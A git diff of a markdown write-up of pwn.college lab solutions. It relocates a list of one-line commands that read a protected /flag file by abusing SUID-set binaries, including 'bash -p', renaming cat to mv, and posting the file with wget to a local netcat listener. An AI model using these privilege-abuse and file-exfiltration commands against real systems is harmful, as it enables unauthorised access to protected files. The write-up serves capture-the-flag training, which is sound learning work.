@@ -1,6 +1,6 @@
 # pwn.college writeup
 
-## Prenote
+## Premise
 
 - Personal solutions, that is saying maybe not the best.
 - The sequence number of each section is the challenge number. **CORRESPONDING.**
@@ -12,7 +12,164 @@
 - When first enter a new challenge, maybe need to execute the level program purely to get the specifically random value before coding any solutions.
 - The order number is the corresponding challenge number, however, in some certain semester, both are not same, readers should looking for the order number which locates in head of each line under solutions section.
 
-## Archive F2021
+## Fundamentals
+
+### Program Misuse
+
+#### Solutions
+
+1. `cat /flag`
+
+2. `more /flag`
+
+3. `less /flag`
+
+4. `tail /flag`
+
+5. `head /flag`
+
+6. `sort /flag`
+
+7. `vim /flag`
+
+8. `emacs /flag`
+
+9. `nano /flag`
+
+10. `rev /flag | rev`
+
+11. `od -c -w1024 /flag | awk -F" " -v OFS='' '{$1="";print $0}'` or `od -c -w1024 /flag | sed -Ee 's/[0-9]{7}//;s/ //g'`
+    - `man od` or `od --help` can peek the usage of `od`
+      - `-c` same as `-t c`,  select printable characters or backslash escapes
+      - `-w[BYTES]`, `--width[=BYTES]`, output BYTES bytes per output line; 32 is implied when BYTES is not specified
+    - `awk` is a column based data filter
+      - `-F`, `--field-separator fs`, set the `FS` variable to `fs`, using `fs` to split input content, so here is `space`
+      - `-v var=val`, `--assign var=val`, set the variable `var` to the value `val` *before* execution of the program begins. `OFS` is output-field-separator, so here using `null` to reformat the output
+      - `'{$1="";print $0}'` is the command
+        - First, let the first column be `null`
+        - Second, print all the columns
+    - `sed` is a stream editor
+      - `-E`, use extended regular expressions
+      - `-e`, execute multiple `sed` commands
+      - `'s/[0-9]{7}//;s/ //g'`
+        - `s/[0-9]{7}//` delete the offset address displayed number
+        - `s/ //g` delete all the whitespaces
+    
+12. `hd /flag | awk '{print $(NF)}' | tr -d '\n' | sed -Ee 's/\|//g;s/\.[0-9]{8}/\n/'`
+    - `awk` part
+      - use the last column
+    - `tr`, translate, squeeze, and/or delete characters
+      - remove all the `Enter(\n)`
+    - `sed` part
+      - delete all the `|` characters
+      - transform all `.XXXXXXXX` pattern (`X` is one number) into a `Enter(\n)`
+    
+13. `xxd /flag | awk '{print $(NF)}' | tr -d '\n' | sed 's/\.$/\n/'`
+
+14. `base32 /flag | base32 -d`
+
+15. `base64 /flag | base64 -d`
+
+16. `split /flag | cat ./xaa`
+
+17. `gzip -c /flag | zcat`
+
+18. `bzip2 -c /flag | bzcat`
+
+19. `zip - /flag | zcat`
+
+20. `tar -cvf - /flag | cat`
+
+21. ```bash
+    ar -rvs ~/tmp.a /flag; ar -x ~/tmp.a flag; cat flag
+    # then remove files
+    rm -rf tmp.a flag
+    ```
+
+22. `echo "/flag" | cpio -ov > flag.cpio && cat flag.cpio`
+
+23. **EXTREMELY HARD** `genisoimage -sort /flag -o - /flag`
+    
+- `genisoimage --help 2>&1 | grep FILE`
+    - [https://www.youtube.com/watch?v=14mIjpOXnrM&t=733](https://www.youtube.com/watch?v=14mIjpOXnrM&t=733)
+    
+24. `env -i cat /flag`
+
+25. `find / -maxdepth 1 -name flag -exec cat {} \;`
+
+26. `echo -e "ans: /flag\n\tcat /flag" > Makefile && make`
+
+27. `nice cat /flag`
+
+28. `timeout 1000 cat /flag`
+
+29. `stdbuf -o L cat /flag`
+
+30. `setarch x86_64 -v cat /flag`
+
+31. `watch -x cat /flag`
+
+32. `socat - /flag`
+
+33. `whiptail --textbox /flag 20 60`
+
+34. `awk '{print $0}' /flag`
+
+35. `sed -n 'p' /flag`
+
+36. ```bash
+    ed /flag
+    .
+    q
+    ```
+
+37. `chown -v hacker /flag && cat /flag`
+
+38. `chmod 444 /flag && cat /flag`
+
+39. `cp -v --no-preserve=all /flag ./flag && cat ./flag && rm -rf ./flag`
+
+40. **HARD** `/challenge/babysuid_level40 && mv /usr/bin/cat /usr/bin/mv && /challenge/babysuid_level40 && mv /flag`
+
+    - This level's solution is pretty tricky
+    - The level said it had set the `suid` for `mv` after we executed it. So remember, it set the `suid` just for a program called `mv`. `mv` is just a name, no matter what it is in its core logic. That is saying we can replace it with others.
+    - Here we just rename `cat` to `mv`, and covered the original `mv` program, then execute level program to get the `suid` privilege for present `mv` program (However, in core logic, it's `cat` program)
+    - Finally, 'cat' it, but our command should be `mv /flag`
+
+41. `perl -e 'open(FILE,"</flag");$line=<FILE>;foreach ($line){print $_;}'`
+
+42. `python -c 'print(open("/flag").read())'`
+
+43. `echo 'puts File.read("/flag")' > test.rb && /usr/bin/ruby test.rb && rm -rf test.rb`
+
+44. ```bash
+    bash -p
+    cat /flag
+    ```
+    
+    - **HARD**
+    - Recommend source: [bash suid](https://gtfobins.github.io/gtfobins/bash/#suid)
+
+45. `date -f /flag`
+
+46. `dmesg -F /flag`
+
+47. `wc --files0-from=/flag`
+
+48. **HARD** `gcc -x assembler /flag`
+
+49. `as @/flag`
+
+50. **HARD** `wget -bv --post-file=/flag 127.0.0.1:3864 | nc -vl 127.0.0.1 3864`
+
+    - DO NOT use the `-i` option, it turns all the `flag` letters to lowercase because of the `url` encoding rule.
+
+51. TODO
+
+#### Confusing Question Numbers
+
+- 17
+- **20** ( really confused )
 
 ### Program Interaction
 
@@ -340,178 +497,19 @@
 
 48. 
 
-
-
 #### Confusing Question Numbers
 
 - 7
 - 15
 - 21
 
-
-
 #### TODO
 
 - Use `sed` to replace all the interaction steps ( `vim` etc. ).
 
+### Assembly Crash Course
 
-
-### Program Misuse
-
-#### Solutions
-
-1. `cat /flag`
-
-2. `more /flag`
-
-3. `less /flag`
-
-4. `tail /flag`
-
-5. `head /flag`
-
-6. `sort /flag`
-
-7. `vim /flag`
-
-8. `emacs /flag`
-
-9. `nano /flag`
-
-10. `rev /flag | rev`
-
-11. `od -c -w1024 /flag | awk -F" " -v OFS='' '{$1="";print $0}'` or `od -c -w1024 /flag | sed -Ee 's/[0-9]{7}//;s/ //g'`
-    - `man od` or `od --help` can peek the usage of `od`
-      - `-c` same as `-t c`,  select printable characters or backslash escapes
-      - `-w[BYTES]`, `--width[=BYTES]`, output BYTES bytes per output line; 32 is implied when BYTES is not specified
-    - `awk` is a column based data filter
-      - `-F`, `--field-separator fs`, set the `FS` variable to `fs`, using `fs` to split input content, so here is `space`
-      - `-v var=val`, `--assign var=val`, set the variable `var` to the value `val` *before* execution of the program begins. `OFS` is output-field-separator, so here using `null` to reformat the output
-      - `'{$1="";print $0}'` is the command
-        - First, let the first column be `null`
-        - Second, print all the columns
-    - `sed` is a stream editor
-      - `-E`, use extended regular expressions
-      - `-e`, execute multiple `sed` commands
-      - `'s/[0-9]{7}//;s/ //g'`
-        - `s/[0-9]{7}//` delete the offset address displayed number
-        - `s/ //g` delete all the whitespaces
-    
-12. `hd /flag | awk '{print $(NF)}' | tr -d '\n' | sed -Ee 's/\|//g;s/\.[0-9]{8}/\n/'`
-    - `awk` part
-      - use the last column
-    - `tr`, translate, squeeze, and/or delete characters
-      - remove all the `Enter(\n)`
-    - `sed` part
-      - delete all the `|` characters
-      - transform all `.XXXXXXXX` pattern (`X` is one number) into a `Enter(\n)`
-    
-13. `xxd /flag | awk '{print $(NF)}' | tr -d '\n' | sed 's/\.$/\n/'`
-
-14. `base32 /flag | base32 -d`
-
-15. `base64 /flag | base64 -d`
-
-16. `split /flag | cat ./xaa`
-
-17. `gzip -c /flag | zcat`
-
-18. `bzip2 -c /flag | bzcat`
-
-19. `zip - /flag | zcat`
-
-20. `tar -cvf - /flag | cat`
-
-21. ```bash
-    ar -rvs ~/tmp.a /flag; ar -x ~/tmp.a flag; cat flag
-    # then remove files
-    rm -rf tmp.a flag
-    ```
-
-22. `echo "/flag" | cpio -ov > flag.cpio && cat flag.cpio`
-
-23. **EXTREMELY HARD** `genisoimage -sort /flag -o - /flag`
-    
-- `genisoimage --help 2>&1 | grep FILE`
-    - [https://www.youtube.com/watch?v=14mIjpOXnrM&t=733](https://www.youtube.com/watch?v=14mIjpOXnrM&t=733)
-    
-24. `env -i cat /flag`
-
-25. `find / -maxdepth 1 -name flag -exec cat {} \;`
-
-26. `echo -e "ans: /flag\n\tcat /flag" > Makefile && make`
-
-27. `nice cat /flag`
-
-28. `timeout 1000 cat /flag`
-
-29. `stdbuf -o L cat /flag`
-
-30. `setarch x86_64 -v cat /flag`
-
-31. `watch -x cat /flag`
-
-32. `socat - /flag`
-
-33. `whiptail --textbox /flag 20 60`
-
-34. `awk '{print $0}' /flag`
-
-35. `sed -n 'p' /flag`
-
-36. ```bash
-    ed /flag
-    .
-    q
-    ```
-
-37. `chown -v hacker /flag && cat /flag`
-
-38. `chmod 444 /flag && cat /flag`
-
-39. `cp -v --no-preserve=all /flag ./flag && cat ./flag && rm -rf ./flag`
-
-40. **HARD** `/challenge/babysuid_level40 && mv /usr/bin/cat /usr/bin/mv && /challenge/babysuid_level40 && mv /flag`
-
-    - This level's solution is pretty tricky
-    - The level said it had set the `suid` for `mv` after we executed it. So remember, it set the `suid` just for a program called `mv`. `mv` is just a name, no matter what it is in its core logic. That is saying we can replace it with others.
-    - Here we just rename `cat` to `mv`, and covered the original `mv` program, then execute level program to get the `suid` privilege for present `mv` program (However, in core logic, it's `cat` program)
-    - Finally, 'cat' it, but our command should be `mv /flag`
-
-41. `perl -e 'open(FILE,"</flag");$line=<FILE>;foreach ($line){print $_;}'`
-
-42. `python -c 'print(open("/flag").read())'`
-
-43. `echo 'puts File.read("/flag")' > test.rb && /usr/bin/ruby test.rb && rm -rf test.rb`
-
-44. ```bash
-    bash -p
-    cat /flag
-    ```
-    
-    - **HARD**
-    - Recommend source: [bash suid](https://gtfobins.github.io/gtfobins/bash/#suid)
-
-45. `date -f /flag`
-
-46. `dmesg -F /flag`
-
-47. `wc --files0-from=/flag`
-
-48. **HARD** `gcc -x assembler /flag`
-
-49. `as @/flag`
-
-50. **HARD** `wget -bv --post-file=/flag 127.0.0.1:3864 | nc -vl 127.0.0.1 3864`
-
-    - DO NOT use the `-i` option, it turns all the `flag` letters to lowercase because of the `url` encoding rule.
-
-51. TODO
-
-#### Confusing Question Numbers
-
-- 17
-- **20** ( really confused )
+`TODO`
 
 ### Debugging Refresher
 
@@ -654,27 +652,11 @@
      - In general, `set disassembly-flavor intel` can be in there.
    - `silent` indicates that we want gdb to not report that we have hit a breakpoint, to make the output a bit cleaner.
 
-## Computer Systems Security (ASU CSE 466)
-
-### Program Misuse
-
-Same as `Archive F2021 - Program Misuse`.
-
-### Program Interaction
-
-Same as `Archive F2021 - Program Interaction`.
-
-### Debugging Refresher
-
-Same as `Archive F2021 - Debugging Refresher`.
-
-8. TODO
-
-## Introduction to Cybersecurity (ASU CSE 365)
+## Intro to Cybersecurity
 
 ### Talking Web
 
-#### Prenote
+#### Premise
 
 In each level, before taking any operation, we must let the server run. However, after we run it, the current terminal can NOT type other commands. So we need a terminal multiplexer in order to input final command that can get the `flag` of each level.
 
@@ -692,3 +674,66 @@ tmux new -s work
 1. `curl 127.0.0.1`
 2. 
 
+### Building a Web Server
+
+### Intercepting Communication
+
+### Cryptography
+
+### Web Security
+
+## Program Security
+
+### Shellcode Injection
+
+### Reverse Engineering
+
+### Memory Errors
+
+### Program Exploitation
+
+## System Security
+
+### Introduction
+
+**No challenges in this module.**
+
+### Sandboxing
+
+### Race Conditions
+
+### Kernel Security
+
+### System Exploitation
+
+## Software Exploitation
+
+### Return Oriented Programming
+
+### Format String Exploits
+
+### File Struct Exploits
+
+### Dynamic Allocator Misuse
+
+### Exploitation Primitives and Memory Mastery
+
+### Dynamic Allocator Exploitation
+
+## Archived Modules
+
+### Memory Errors
+
+### Advanced Exploitation
+
+## Example Dojo
+
+### Hello
+
+### World
+
+## Example Import Dojo
+
+### Hello
+
+### Planet
